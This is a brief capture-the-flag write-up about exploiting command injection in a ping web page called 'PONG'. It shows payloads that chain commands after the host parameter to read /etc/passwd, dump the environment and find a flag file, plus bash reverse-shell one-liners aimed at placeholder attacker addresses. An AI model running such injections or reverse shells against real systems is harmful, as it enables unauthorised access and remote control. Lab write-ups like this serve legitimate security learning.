<h1>PONG</h1>

<h2>The App</h2>

<p>When opening the site, the following text appears:</p>

<p><code>
Command executed: ping -c 2 127.0.0.1
</code></p>

<p>The URL is <code>/index.php?host=127.0.0.1</code> which indicates that the IP or maybe more is controllable.</p>

<h2>Tried solutions &amp; solution</h2>

<p>I tried to set <code>host=127.0.0.1;cat /etc/passwd</code> which showed the content of the <code>/etc/passwd</code> file. This measn we can control the command and inject our own.</p>

<p>I then tried to inject <code>127.0.0.1;bash -c bash -i &gt;&amp; /dev/tcp/&lt;attack-ip-with-netcat-open&gt;/&lt;attacker-netcat-port&gt; 0&gt;&amp;1</code> as URL encoded payload to open a reverse shell but it didn't work.</p>

<p>I then tried <code>127.0.0.1;ls .</code> but it returned only <code>index.php</code>. </p>

<p><code>127.0.0.1;echo $PWD</code> shows, that the directory is <code>/var/www/html</code>. </p>

<p><code>127.0.0.1;env</code> showed:</p>

<p><code>
PHP_INI_DIR=/usr/local/etc/php
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_VERSION=7.4.30
GPG_KEYS=42670A7FE4D0441C8E4632349E4FDC074A4EF02D 5A52880781F755608BF815FC910DEB46F53EA312
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-7.4.30.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-7.4.30.tar.xz
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHPIZE_DEPS=autoconf        dpkg-dev        file        g++         gcc         libc-dev        make        pkg-config      re2c
PWD=/var/www/html
PHP_SHA256=ea72a34f32c67e79ac2da7dfe96177f3c451c3eefae5810ba13312ed398ba70d
</code>
So no flag there.</p>

<p><code>127.0.0.1;ls /root</code> showed nothing.</p>

<p>I tried multiple attempts to open a reverse shell but it didn't work (for example I tried <code>bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;ATTACKER-PORT&gt; 0&gt;&amp;1</code> but no luck).</p>

<p>Okay, seems that only a Webshell works.</p>

<p>My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.</p>

<p>Then I tried to serch for the flag with the payload <code>ls /</code>. This revealed a <code>flag.txt</code> file entry which I could read by calling <code>cat /flag.txt</code></p>
